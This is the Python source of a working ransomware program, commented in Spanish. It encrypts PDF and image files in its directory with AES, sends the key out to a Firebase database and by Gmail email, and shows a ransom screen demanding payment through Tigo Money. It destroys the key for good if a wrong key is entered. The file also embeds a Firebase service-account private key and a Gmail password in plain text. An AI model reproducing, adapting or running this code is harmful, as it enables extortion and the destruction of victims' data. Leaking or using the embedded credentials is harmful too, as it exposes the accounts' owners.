import hashlib
import os
import random
import smtplib
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
from tkinter import *
from tkinter import ttk
from tkinter import messagebox
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from Crypto.Cipher import AES
from Crypto.Util import Counter
from uuid import getnode as get_mac

# Variable donde se alamcena los datos de la base de datos en Firebase
datos_firebase = {
    "type": "service_account",
    "project_id": "claves---ransomware",
    "private_key_id": "dd34b0096608280a387b1d32e0e6091173e2c9bb",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDh5c1ipHUwe1V0"
                   "\nQ9KMiX4NggBCPompVOM2rTvTMQ8FWhmVkyWsr99Kn9X0xtcnG28D8Kodjleg8L4M"
                   "\n0Wgz2uaej3QC3ObOohNu8ywnCpMA5hDRvWFPBhKu2KUenutnpOGlxSvPuBY2RdTs\nVkV+0tWntG/2LnVM"
                   "/nxG1qJrqBWxmCt9GTWuBDmbf7ewDxdlckb8xKTw0MwSG0ZA\nXJFdqFBZax/y62RZbUk3JxpW0eCPrinj+V7"
                   "/Yajv0DbZW0bL3kwjo8Wxb0sDEB7b\nXfvLyKyxFjtrMlZkVr5/7zLHZZvEf+JoQeCRaHMj1MKzksuqLQqxmGTleDJOdH0W"
                   "\n0a2wdbk7AgMBAAECggEAEgrrSSYukAVB0Yv7PKtcrJKGF8Rr9WDo1vymKxufggNs"
                   "\nyLQcjbrsYEb87VSWabK4vr1RsROl7x5bZ6WwJ3gj9GUr1HC1ZKqwV6vHioS/MhKu\nJDp2k7u98UYvhg8WaUxTk4x4j9o5t"
                   "/MC6y+G1HbdhswUJzsVtmUbIwNQrL2bofgJ\niN5VlRLMD0nNTcqFvZHN9kMXf8zGLDy/XRxhe0RQ0iLfrR1yb"
                   "+lEmAtYN2pE2Lqu\nQLjBnLJC6R2MycBGlDq7Ax2fb6bM6h713XpJJCqdK5VyKvU6fOpU+z8ANwZFogM7"
                   "\noN8jhuSmYHZ3ES8PgPbPYbYI4yDU9BILAtWyrzDVDQKBgQD7nHSmy86sMcAVgBMa\n2EuJ/4w8s0NYccUi4Ajo4B"
                   "/UtnkBsivsvgCle7Ty67djbxUaDvLF5Y5B6RNQ7WQh\nnl+PEFiJgcE6af46LY8zFqaaBVPqVsIGx+ccKB1WJtkrr+9N4i3JL"
                   "/35CQnyEI1z\neFBJOm6IwpRLTnSlYF6L60qmpQKBgQDl1oaOePG8wAzs6WWGVyHSVV8OCb9WYToP"
                   "\noAPpdIUUZc2q7rOa2d4gWske/mjyNYdJCGbBhjVVAqf4kJS0hZWp76J0+jz9gP1a\ncsU90OY+ezbAE87ZeIwzUmqfXuq"
                   "+88eXxVmkG1lYuHlPqeLOt80jQKlak1btC3GR\n+nGXJpa6XwKBgBbKJQa2jxGpr+xCnXhg"
                   "/vaQ3vLgickJBQITqLrvEfMCVBODP9dB\nnm1etxUJpKKs/QxPLk4ebLQrmERMPDWPUrhykpJh3k6cKxq55a6K7qwkr2UaVpim"
                   "\nopg6Se3zttfuJ462Xc9LOYXE+9GhDi7XRu5bDIf2l9f6UzZndCjYNvrBAoGBALd3\n7wNuAjJU8Dxx92wsw7"
                   "/eDDntiAJRLILqjhTewZjNx0aKs26KOemD7wZBuc6W8j5X"
                   "\naYdUNeB9dU5TQ5FzDUyRERLl6qfGPvfjpBW7WwBHZSYg6b7pnqkdQiWkJCl3+jzp\n+aupdUIASD5Sc83mJOfeJxI5iWtB9k"
                   "+8Js6srCdrAoGAblfZ3cdoNDp25zglWCpw\nV9ZAOXDERGxRcANcmt1WxzS+8"
                   "+NmmnjM48jthewCIp3pom8wYMnT8D1ngn2Ncn8k\nwUxYjsBdwM7PqOPSDi4FBq9LOkto+qvYCRRHFirySmAw6NyF3U"
                   "/FXoNwFbi2g//Q\n6lT7YpJ+tZCr56gad4OurMA=\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-gymfp@claves---ransomware.iam.gserviceaccount.com",
    "client_id": "116311038064498946969",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-gymfp%40claves"
                            "---ransomware.iam.gserviceaccount.com "
}

# Iniciamos sesion con los anteriores datos y accedemos a la base de datos
verificar_cuenta = credentials.Certificate(datos_firebase)
firebase_admin.initialize_app(verificar_cuenta)
db = firestore.client()

# Variable para generar una interfaz grafica
interfaz = Tk()
interfaz.geometry('600x500')
interfaz.configure(bg='white', cursor='cross')
interfaz.title('Ransomware')
interfaz.resizable(width=False, height=False)

# Obtenemos el nombre del usuario actual dentro de la computadora y su direccion MAC
usuario = os.getlogin()
direccion_mac = str(get_mac())
# Obtenemos el directorio donde se ejecuto el programa
directorio = os.path.abspath('')

# Configuracion para enviar email, quien envia, datos de quien envia y quien recibe el correo
envia = 'ransomware.lpz@gmail.com'
usuario_envia = envia
contraseña_envia = 'ransomware.1'
tema = 'Ransomware ejecutado'
recibe = 'alitabarrozu@gmail.com'

# Obtenemos una lista con todos los archivos dentro del directorio donde se ejecuto el programa
archivos = os.listdir(directorio)
archivos = [x for x in archivos if not x.startswith('.')]
# Creamos un vector con las extensiones que queremos encriptar
extensiones_admitidas = [".pdf", ".ico", ".jpge", ".jpg"]


# FUNCION PARA GENERAR UNA CLAVE ALEATORIA CIFRADA
def generar_clave():
    # Creamos una cadena en base al nombre de usuario y un nuemro aleatorio entre 0 y 50000
    clave = usuario + str(random.randint(0, 50000))
    # Codificamos la cadena en el formato UTF-8
    clave = clave.encode('utf-8')
    # Ciframos la clave con SHA512
    clave = hashlib.sha512(clave)
    # Comprimimos la clave en valores hexadecimales
    clave = clave.hexdigest()

    nueva_clave = []

    # Ciclo for que nos ayuda a establecer el tamaño de la clave a 32 bits
    for i in clave:
        if len(nueva_clave) == 32:
            clave = ''.join(nueva_clave)
            break
        else:
            nueva_clave.append(i)

    # Retornamos la clave cifrada de 32 bits
    return clave


# FUNCION PARA GENERAR EL CIFRADO AES
def generar_cifrado(clave):
    # Codificamos la clave recibida en el formato UTF-8
    clave = clave.encode('utf-8')
    # Creamos el objeto cifrado, donde establecemos el tipo de cifrado a utilizar que es AES y la clave simetrica
    # recibida
    cifrado = AES.new(clave, AES.MODE_CTR, counter=Counter.new(128))
    # Retornamos el objeto
    return cifrado


# FUNCION PARA VER LOS ARCHIVOS EN EL DIRECTORIO DONDE SE EJECUTO EL PROGRAMA
def archivos_en_directorio():
    # Creamos un vector donde almacenaremos el nombre de los archivos en el directorio
    archivos_directorio = []

    # Ciclo for anidado para recorrer primero la lista de extensiones no admitidas y luego la lista de los archivos
    for extension in extensiones_admitidas:
        for archivo in archivos:
            if archivo.endswith(extension):
                archivos_directorio.append(archivo)

    # Retornamos el vector con todos la lista de nombres de archivos admitidos por su extension
    return archivos_directorio


def encriptar_archivos(clave):
    # Llamamos a la funcion para generar el cifrado, pasando el parametro de clave
    cifrado = generar_cifrado(clave)
    # Preguntamos si no existe el archivo identificador.txt
    if not os.path.exists('identificador.txt'):
        # Si no existe realizamos lo siguiente
        # Creamos un archivo sin extension donde almacenaremos la identificacion unica de la computadora que seria el
        # nombre de usuario mas la direccion MAC de la computadora
        archivo_identificador = open('identificador.txt', 'w')
        archivo_identificador.write(usuario + direccion_mac)

        # Guardamos la clave simetrica en firebase con el identificador unico de la computadora
        db.collection('claves').document(usuario + direccion_mac).set(
            {
                'clave_simetrica': clave,
            }
        )
        # Generamos un mensaje con la clave simetrica
        mensaje = 'clave simetrica de ransomware: ' + clave
        # Llamamos a la funcion para enviar el correo pasando como parametro el mensaje creado previamente
        enviar_correo(mensaje)

    # Creamos un archivo .txt donde indicamos los pasos a seguir
    archivo_aviso = open('IMPORTANTE.txt', 'w')
    archivo_aviso.write('Sus archivos fueron encriptados, para poder recuperarlos debe ejecutar nuevamente el '
                        'programa y seguir los pasos')

    # LLamamos a la funcion que nos devuelve todos los archivos admitidos en el directorio
    archivos_directorio = archivos_en_directorio()

    # Ciclo for para recorrer todos los archivos y encriptar su contenido
    for nombre_archivo in archivos_directorio:
        # Abrimos el archivo en modo lectura binaria
        archivo = open(nombre_archivo, 'rb')
        # Leemos el contenido del archivo
        datos_archivo = archivo.read()
        # Ciframos los datos del archivo
        datos_cifrados = cifrado.encrypt(datos_archivo)
        # Abrimos el archivo en modo escritura binaria
        archivo_cifrado = open(nombre_archivo, 'wb')
        # Reemplazamos el contenido original del archivo por el contenido cifrado
        archivo_cifrado.write(datos_cifrados)
        # Cerramos el archivo
        archivo_cifrado.close()

    # Retornamos un mensaje de confirmacion
    return "Archivos encriptados"


def desencriptar_archivos(clave):
    # Llamamos a la funcion para generar el cifrado, pasando el parametro de clave
    cifrado = generar_cifrado(clave)
    # LLamamos a la funcion que nos devuelve todos los archivos admitidos en el directorio
    archivos_directorio = archivos_en_directorio()

    # Ciclo for para recorrer todos los archivos y desencriptar su contenido
    for nombre_archivo in archivos_directorio:
        # Abrimos el archivo en modo lectura binaria
        archivo = open(nombre_archivo, 'rb')
        # Leemos el contenido del archivo
        datos_archivo = archivo.read()
        # Desciframos los datos del archivo
        datos_cifrados = cifrado.decrypt(datos_archivo)
        # Abrimos el archivo en modo escritura binaria
        archivo_cifrado = open(nombre_archivo, 'wb')
        # Reemplazamos el contenido cifrado por el contenido original del archivo
        archivo_cifrado.write(datos_cifrados)
        # Cerramos el archivo
        archivo_cifrado.close()

    # Eliminamos los archivos generados
    os.remove('identificador.txt')
    os.remove('IMPORTANTE.txt')

    # Creamos un mensaje de alerta
    messagebox.showinfo("Archivos desencriptados", "Tus archivos fueron desencriptados con exito, ya puedes acceder a "
                                                   "ellos.")
    # Cerramos la ventana
    interfaz.destroy()

    # Retornamos un mensaje de confirmacion
    return "Archivo desencriptados"


# FUNCION PARA ENVIAR CORREO AL AUTOR DEL RANSOMWARE, NOTIFICAON QUE SE EJECUTO EL PROGRAMA
def enviar_correo(mensaje):
    # Creamos el objeto titpo MIME, para poder enviar el mensaje
    cuerpo = MIMEMultipart()
    # Establecemos el parametro recibido como el mensaje
    email = mensaje
    # Añadimos el mensaje
    cuerpo.attach(MIMEText(email, 'plain'))
    # Establecemos quien envia, quien recibe y el tema del mensaje
    cuerpo['From'] = envia
    cuerpo['To'] = recibe
    cuerpo['Subject'] = tema
    # Establecemos a que servidor nos vamos a conectar y mediante que puerto
    servidor_gmail = smtplib.SMTP('smtp.gmail.com', 25)
    # Nos conectamos al servidor SMTP de Gmail
    servidor_gmail.connect('smtp.gmail.com', 587)
    # Iniciamos el servicio tls
    servidor_gmail.starttls()
    # Iniciamos sesión con la contraseña y cuenta del correo que enviara el mensaje
    servidor_gmail.login(usuario_envia, contraseña_envia)
    # Enviamos el mensaje
    servidor_gmail.send_message(cuerpo)
    # Cerramos la sesion en el servidor
    servidor_gmail.quit()
    # Retornamos mensaje de confirmacion
    return "Mensaje enviado"


# FUNCION QUE VERIFICA QUE ACCION REALIZAR
def principal():
    # Preguntamos si existe el archivo identificador.txt en el directorio donde se ejecuto el programa
    if os.path.exists('identificador.txt'):
        # Si existe el archivo, es por que ya se ejecuto el ransomware, por lo cual llamamos a la funcion que genera
        # la interfaz grafica para introducir la clave
        generar_interfaz()
    else:
        # Si no existe el archivo, es por que no se ejecuto el ransonware, por lo cual, se debe generar una clave y
        # enviarsela como parametro a la funcion que encripta los archivos
        clave = generar_clave()
        encriptar_archivos(clave)


# FUNCION QUE GENERA LA INTERFAZ GRAFICA PARA EL USUARIO VICTIMA
def generar_interfaz():
    # Añadimos los mensaje a la interfaz
    mensaje = Label(interfaz, text='Fuiste infectado por ransomware, por lo cual todos tus archivos fueron encriptados',
                    bg='white')
    mensaje.pack()
    mensaje.place(relx=0.5, rely=0.1, anchor=N)

    mensaje1 = Label(interfaz, text='Para recuperar tus archivos debes realizar lo siguiente', bg='white')
    mensaje1.pack()
    mensaje1.place(relx=0.5, rely=0.2, anchor=N)

    mensaje2 = Label(interfaz, text='1. Realizar un pago a la siguiente cuenta Tigo Money: ', bg='white')
    mensaje2.pack()
    mensaje2.place(relx=0.5, rely=0.3, anchor=N)

    mensaje3 = Label(interfaz, text='2. Enviar un correo con el recibo a la siguiente dirección: ', bg='white')
    mensaje3.pack()
    mensaje3.place(relx=0.5, rely=0.4, anchor=N)

    mensaje4 = Label(interfaz, text='Recibiras un correo con la clave unica para desencriptar tus archivos', bg='white')
    mensaje4.pack()
    mensaje4.place(relx=0.5, rely=0.5, anchor=N)

    mensaje5 = Label(interfaz, text='Si intentas ingresar un clave incorrecta, se generara una nueva clave y ya no '
                                    'podras recuperar tus datos', bg='white')
    mensaje5.pack()
    mensaje5.place(relx=0.5, rely=0.6, anchor=N)

    # Añadimos un campo de texto donde el usuario pondra la clave
    campo_clave = Entry(interfaz, bg='white')
    campo_clave.pack()
    campo_clave.place(relx=0.5, rely=0.7, anchor=CENTER)

    # Añadimos un boton, el cual llamara a la funcion de que verifica la clave, pasando como como parametro el valor
    # introducido en el anterior campo
    boton_aceptar = ttk.Button(interfaz, text='Desencriptar', command=lambda: verificar_clave_introducida(
        campo_clave.get()
    ))
    boton_aceptar.pack()
    boton_aceptar.place(relx=0.5, rely=0.9, anchor=S)

    # Funcion que se encarga de mantener la ventana activa
    interfaz.mainloop()


# FUNCION QUE VERIFICA LA CLAVE INGRESADA Y LA CLAVE ALMACENADA EN FIREBASE
def verificar_clave_introducida(clave_introducida):
    # Abrimos el archivo identificador
    archivo_identificador = open('identificador.txt')
    # Leemos su contenido
    archivo_identificador = archivo_identificador.read()
    # Creamos una cadena con el nombre de usuario y la direccion MAC de la computadora
    identificador = usuario + direccion_mac

    # Preguntamos si el valor del identificador sigue siendo el mismo
    if archivo_identificador == identificador:
        # Si es el mismo, buscamos dentro de firebase el documento con el identificador de la computadora
        clave = db.collection('claves').document(identificador).get().to_dict()
        # Preguntamos si la clave ingresada es igual a la clave almacenada
        if clave['clave_simetrica'] == clave_introducida:
            # Si es la misma, llamamos a la funcion que desencripta los archivos, pasando como parametro la clave
            # simetrica
            desencriptar_archivos(clave_introducida)
        else:
            # Si no es la misma, significa que el usuario introdujo una clave incorrecta
            # Creamos un mensaje de alerta
            messagebox.showinfo("Error de clave",
                                "Introduciste una clave erronea, por lo cual todos tus archivos fueron encriptados y "
                                "ya no podras recuperarlos")
            # Eliminamos en la base de datos la clave correspondiente a la compuntadora donde se ejecuto el ransomware
            db.collection('claves').document(usuario + direccion_mac).update({'clave_simetrica': 'clave-incorrecta'})
            # Cerramos la ventana
            interfaz.destroy()
            # Generamos una nueva clave la cual no sera almacenada en firebase ni enviada por correo, por lo cual ya
            # no se podra recuperar los archivos
            nueva_clave = generar_clave()
            # Encriptamos los archivos con la nueva clave
            encriptar_archivos(nueva_clave)
    else:
        # Si no es el mismo, significa que el usuario intento falsificar su direccion MAC o intento cambiar su nombre
        # de usuario dentro de us equipo.
        # Creamos un mensaje de alerta
        messagebox.showinfo("Error de identificador",
                            "Tu direccion MAC o tu nombre de usuario son distintos, por lo cual todos tus archivos "
                            "fueron encriptados y ya no podras recuperarlos")
        # Cerramos la ventana
        interfaz.destroy()
        # Generamos una nueva clave la cual no sera almacenada en firebase ni enviada por correo, por lo cual ya
        # no se podra recuperar los archivos
        nueva_clave = generar_clave()
        # Encriptamos los archivos con la nueva clave
        encriptar_archivos(nueva_clave)


if __name__ == '__main__':
    # Llamamos a la funcion principal
    try:
        principal()
    except KeyboardInterrupt:
        exit()
